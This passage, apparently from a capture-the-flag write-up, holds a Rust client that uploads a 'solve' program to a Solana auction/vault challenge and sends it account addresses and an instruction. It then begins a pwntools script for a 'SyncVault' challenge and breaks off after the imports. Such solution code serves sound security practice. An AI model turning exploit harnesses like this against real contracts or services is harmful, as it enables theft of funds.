</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=k>mut</span><span class=w> </span><span class=n>reader</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>BufReader</span>::<span class=n>new</span><span class=p>(</span><span class=n>stream</span><span class=p>.</span><span class=n>try_clone</span><span class=p>().</span><span class=n>unwrap</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=k>mut</span><span class=w> </span><span class=n>line</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=nb>String</span>::<span class=n>new</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// Check deploy first, then release
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>so_path_deploy</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;./solve/target/deploy/solve.so&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>so_path_release</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;./solve/target/release/solve.so&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>so_data</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=n>fs</span>::<span class=n>metadata</span><span class=p>(</span><span class=n>so_path_deploy</span><span class=p>).</span><span class=n>is_ok</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>fs</span>::<span class=n>read</span><span class=p>(</span><span class=n>so_path_deploy</span><span class=p>)</span><span class=o>?</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>fs</span>::<span class=n>read</span><span class=p>(</span><span class=n>so_path_release</span><span class=p>)</span><span class=o>?</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>reader</span><span class=p>.</span><span class=n>read_line</span><span class=p>(</span><span class=o>&amp;</span><span class=k>mut</span><span class=w> </span><span class=n>line</span><span class=p>)</span><span class=o>?</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=fm>writeln!</span><span class=p>(</span><span class=n>stream</span><span class=p>,</span><span class=w> </span><span class=s>&#34;{}&#34;</span><span class=p>,</span><span class=w> </span><span class=n>solve</span>::<span class=no>ID</span><span class=p>)</span><span class=o>?</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>reader</span><span class=p>.</span><span class=n>read_line</span><span class=p>(</span><span class=o>&amp;</span><span class=k>mut</span><span class=w> </span><span class=n>line</span><span class=p>)</span><span class=o>?</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=fm>writeln!</span><span class=p>(</span><span class=n>stream</span><span class=p>,</span><span class=w> </span><span class=s>&#34;{}&#34;</span><span class=p>,</span><span class=w> </span><span class=n>so_data</span><span class=p>.</span><span class=n>len</span><span class=p>())</span><span class=o>?</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>stream</span><span class=p>.</span><span class=n>write_all</span><span class=p>(</span><span class=o>&amp;</span><span class=n>so_data</span><span class=p>)</span><span class=o>?</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>chall</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Pubkey</span>::<span class=n>from_str</span><span class=p>(</span><span class=o>&amp;</span><span class=n>get_line</span><span class=p>(</span><span class=o>&amp;</span><span class=k>mut</span><span class=w> </span><span class=n>reader</span><span class=p>)</span><span class=o>?</span><span class=p>)</span><span class=o>?</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>solve</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Pubkey</span>::<span class=n>from_str</span><span class=p>(</span><span class=o>&amp;</span><span class=n>get_line</span><span class=p>(</span><span class=o>&amp;</span><span class=k>mut</span><span class=w> </span><span class=n>reader</span><span class=p>)</span><span class=o>?</span><span class=p>)</span><span class=o>?</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>admin</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Pubkey</span>::<span class=n>from_str</span><span class=p>(</span><span class=o>&amp;</span><span class=n>get_line</span><span class=p>(</span><span class=o>&amp;</span><span class=k>mut</span><span class=w> </span><span class=n>reader</span><span class=p>)</span><span class=o>?</span><span class=p>)</span><span class=o>?</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>user</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Pubkey</span>::<span class=n>from_str</span><span class=p>(</span><span class=o>&amp;</span><span class=n>get_line</span><span class=p>(</span><span class=o>&amp;</span><span class=k>mut</span><span class=w> </span><span class=n>reader</span><span class=p>)</span><span class=o>?</span><span class=p>)</span><span class=o>?</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>reader</span><span class=p>.</span><span class=n>read_line</span><span class=p>(</span><span class=o>&amp;</span><span class=k>mut</span><span class=w> </span><span class=n>line</span><span class=p>)</span><span class=o>?</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=fm>println!</span><span class=p>(</span><span class=s>&#34;&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=fm>println!</span><span class=p>(</span><span class=s>&#34;chall      : </span><span class=si>{}</span><span class=s>&#34;</span><span class=p>,</span><span class=w> </span><span class=n>chall</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=fm>println!</span><span class=p>(</span><span class=s>&#34;solve      : </span><span class=si>{}</span><span class=s>&#34;</span><span class=p>,</span><span class=w> </span><span class=n>solve</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=fm>println!</span><span class=p>(</span><span class=s>&#34;admin      : </span><span class=si>{}</span><span class=s>&#34;</span><span class=p>,</span><span class=w> </span><span class=n>admin</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=fm>println!</span><span class=p>(</span><span class=s>&#34;user       : </span><span class=si>{}</span><span class=s>&#34;</span><span class=p>,</span><span class=w> </span><span class=n>user</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=fm>println!</span><span class=p>(</span><span class=s>&#34;&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// Derive PDAs
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>auction_id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>1338</span><span class=k>u64</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>auction_admin_id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>1</span><span class=k>u64</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=p>(</span><span class=n>pda_bidder</span><span class=p>,</span><span class=w> </span><span class=n>_</span><span class=p>)</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Pubkey</span>::<span class=n>find_program_address</span><span class=p>(</span><span class=o>&amp;</span><span class=p>[</span><span class=sa>b</span><span class=s>&#34;helper&#34;</span><span class=p>],</span><span class=w> </span><span class=o>&amp;</span><span class=n>solve</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=p>(</span><span class=n>auction</span><span class=p>,</span><span class=w> </span><span class=n>_</span><span class=p>)</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Pubkey</span>::<span class=n>find_program_address</span><span class=p>(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=o>&amp;</span><span class=p>[</span><span class=sa>b</span><span class=s>&#34;auction&#34;</span><span class=p>,</span><span class=w> </span><span class=n>user</span><span class=p>.</span><span class=n>as_ref</span><span class=p>(),</span><span class=w> </span><span class=o>&amp;</span><span class=n>auction_id</span><span class=p>.</span><span class=n>to_le_bytes</span><span class=p>()],</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=o>&amp;</span><span class=n>chall</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=p>(</span><span class=n>auction_admin</span><span class=p>,</span><span class=w> </span><span class=n>_</span><span class=p>)</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Pubkey</span>::<span class=n>find_program_address</span><span class=p>(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=o>&amp;</span><span class=p>[</span><span class=sa>b</span><span class=s>&#34;auction&#34;</span><span class=p>,</span><span class=w> </span><span class=n>admin</span><span class=p>.</span><span class=n>as_ref</span><span class=p>(),</span><span class=w> </span><span class=o>&amp;</span><span class=n>auction_admin_id</span><span class=p>.</span><span class=n>to_le_bytes</span><span class=p>()],</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=o>&amp;</span><span class=n>chall</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=p>(</span><span class=n>vault</span><span class=p>,</span><span class=w> </span><span class=n>_</span><span class=p>)</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Pubkey</span>::<span class=n>find_program_address</span><span class=p>(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=o>&amp;</span><span class=p>[</span><span class=sa>b</span><span class=s>&#34;vault&#34;</span><span class=p>],</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=o>&amp;</span><span class=n>chall</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=p>(</span><span class=n>bidder_state_user</span><span class=p>,</span><span class=w> </span><span class=n>_</span><span class=p>)</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Pubkey</span>::<span class=n>find_program_address</span><span class=p>(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=o>&amp;</span><span class=p>[</span><span class=sa>b</span><span class=s>&#34;bidder&#34;</span><span class=p>,</span><span class=w> </span><span class=n>auction</span><span class=p>.</span><span class=n>as_ref</span><span class=p>(),</span><span class=w> </span><span class=n>user</span><span class=p>.</span><span class=n>as_ref</span><span class=p>()],</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=o>&amp;</span><span class=n>chall</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=p>(</span><span class=n>bidder_state_pda</span><span class=p>,</span><span class=w> </span><span class=n>_</span><span class=p>)</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Pubkey</span>::<span class=n>find_program_address</span><span class=p>(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=o>&amp;</span><span class=p>[</span><span class=sa>b</span><span class=s>&#34;bidder&#34;</span><span class=p>,</span><span class=w> </span><span class=n>auction</span><span class=p>.</span><span class=n>as_ref</span><span class=p>(),</span><span class=w> </span><span class=n>pda_bidder</span><span class=p>.</span><span class=n>as_ref</span><span class=p>()],</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=o>&amp;</span><span class=n>chall</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=p>(</span><span class=n>bidder_state_admin</span><span class=p>,</span><span class=w> </span><span class=n>_</span><span class=p>)</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Pubkey</span>::<span class=n>find_program_address</span><span class=p>(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=o>&amp;</span><span class=p>[</span><span class=sa>b</span><span class=s>&#34;bidder&#34;</span><span class=p>,</span><span class=w> </span><span class=n>auction_admin</span><span class=p>.</span><span class=n>as_ref</span><span class=p>(),</span><span class=w> </span><span class=n>user</span><span class=p>.</span><span class=n>as_ref</span><span class=p>()],</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=o>&amp;</span><span class=n>chall</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=fm>println!</span><span class=p>(</span><span class=s>&#34;pda_bidder  : </span><span class=si>{}</span><span class=s>&#34;</span><span class=p>,</span><span class=w> </span><span class=n>pda_bidder</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=fm>println!</span><span class=p>(</span><span class=s>&#34;auction     : </span><span class=si>{}</span><span class=s>&#34;</span><span class=p>,</span><span class=w> </span><span class=n>auction</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=fm>println!</span><span class=p>(</span><span class=s>&#34;auction_admin: </span><span class=si>{}</span><span class=s>&#34;</span><span class=p>,</span><span class=w> </span><span class=n>auction_admin</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=fm>println!</span><span class=p>(</span><span class=s>&#34;vault       : </span><span class=si>{}</span><span class=s>&#34;</span><span class=p>,</span><span class=w> </span><span class=n>vault</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=fm>println!</span><span class=p>(</span><span class=s>&#34;bidder_state_user: </span><span class=si>{}</span><span class=s>&#34;</span><span class=p>,</span><span class=w> </span><span class=n>bidder_state_user</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=fm>println!</span><span class=p>(</span><span class=s>&#34;bidder_state_pda : </span><span class=si>{}</span><span class=s>&#34;</span><span class=p>,</span><span class=w> </span><span class=n>bidder_state_pda</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=fm>println!</span><span class=p>(</span><span class=s>&#34;bidder_state_admin: </span><span class=si>{}</span><span class=s>&#34;</span><span class=p>,</span><span class=w> </span><span class=n>bidder_state_admin</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=fm>println!</span><span class=p>(</span><span class=s>&#34;&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>let</span><span class=w> </span><span class=n>ix</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>solve</span>::<span class=n>instruction</span>::<span class=n>Initialize</span><span class=w> </span><span class=p>{};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>let</span><span class=w> </span><span class=n>data</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ix</span><span class=p>.</span><span class=n>data</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>let</span><span class=w> </span><span class=n>ix_accounts</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>solve</span>::<span class=n>accounts</span>::<span class=n>Initialize</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>user</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>pda_bidder</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>challenge</span>: <span class=nc>chall</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>auction</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>auction_admin</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>admin</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>bidder_state_user</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>bidder_state_pda</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>bidder_state_admin</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>vault</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>system_program</span>: <span class=nc>system_program</span>::<span class=no>ID</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>let</span><span class=w> </span><span class=n>metas</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ix_accounts</span><span class=p>.</span><span class=n>to_account_metas</span><span class=p>(</span><span class=nb>None</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>reader</span><span class=p>.</span><span class=n>read_line</span><span class=p>(</span><span class=o>&amp;</span><span class=k>mut</span><span class=w> </span><span class=n>line</span><span class=p>)</span><span class=o>?</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=fm>writeln!</span><span class=p>(</span><span class=n>stream</span><span class=p>,</span><span class=w> </span><span class=s>&#34;{}&#34;</span><span class=p>,</span><span class=w> </span><span class=n>metas</span><span class=p>.</span><span class=n>len</span><span class=p>())</span><span class=o>?</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>for</span><span class=w> </span><span class=n>meta</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=n>metas</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kd>let</span><span class=w> </span><span class=k>mut</span><span class=w> </span><span class=n>meta_str</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=nb>String</span>::<span class=n>new</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>meta_str</span><span class=p>.</span><span class=n>push</span><span class=p>(</span><span class=sc>&#39;m&#39;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=n>meta</span><span class=p>.</span><span class=n>is_writable</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>meta_str</span><span class=p>.</span><span class=n>push</span><span class=p>(</span><span class=sc>&#39;w&#39;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=n>meta</span><span class=p>.</span><span class=n>is_signer</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>meta_str</span><span class=p>.</span><span class=n>push</span><span class=p>(</span><span class=sc>&#39;s&#39;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>meta_str</span><span class=p>.</span><span class=n>push</span><span class=p>(</span><span class=sc>&#39; &#39;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>meta_str</span><span class=p>.</span><span class=n>push_str</span><span class=p>(</span><span class=o>&amp;</span><span class=n>meta</span><span class=p>.</span><span class=n>pubkey</span><span class=p>.</span><span class=n>to_string</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=fm>writeln!</span><span class=p>(</span><span class=n>stream</span><span class=p>,</span><span class=w> </span><span class=s>&#34;{}&#34;</span><span class=p>,</span><span class=w> </span><span class=n>meta_str</span><span class=p>)</span><span class=o>?</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>stream</span><span class=p>.</span><span class=n>flush</span><span class=p>()</span><span class=o>?</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>reader</span><span class=p>.</span><span class=n>read_line</span><span class=p>(</span><span class=o>&amp;</span><span class=k>mut</span><span class=w> </span><span class=n>line</span><span class=p>)</span><span class=o>?</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=fm>writeln!</span><span class=p>(</span><span class=n>stream</span><span class=p>,</span><span class=w> </span><span class=s>&#34;{}&#34;</span><span class=p>,</span><span class=w> </span><span class=n>data</span><span class=p>.</span><span class=n>len</span><span class=p>())</span><span class=o>?</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>stream</span><span class=p>.</span><span class=n>write_all</span><span class=p>(</span><span class=o>&amp;</span><span class=n>data</span><span class=p>)</span><span class=o>?</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>stream</span><span class=p>.</span><span class=n>flush</span><span class=p>()</span><span class=o>?</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>line</span><span class=p>.</span><span class=n>clear</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>while</span><span class=w> </span><span class=n>reader</span><span class=p>.</span><span class=n>read_line</span><span class=p>(</span><span class=o>&amp;</span><span class=k>mut</span><span class=w> </span><span class=n>line</span><span class=p>)</span><span class=o>?</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=mi>0</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=fm>print!</span><span class=p>(</span><span class=s>&#34;</span><span class=si>{}</span><span class=s>&#34;</span><span class=p>,</span><span class=w> </span><span class=n>line</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>line</span><span class=p>.</span><span class=n>clear</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nb>Ok</span><span class=p>(())</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h1 id=pwn>Pwn</h1><h2 id=syncvault>SyncVault</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>s</span>    <span class=o>=</span> <span class=k>lambda</span>   <span class=n>x</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span>   <span class=o>=</span> <span class=k>lambda</span>   <span class=n>x</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
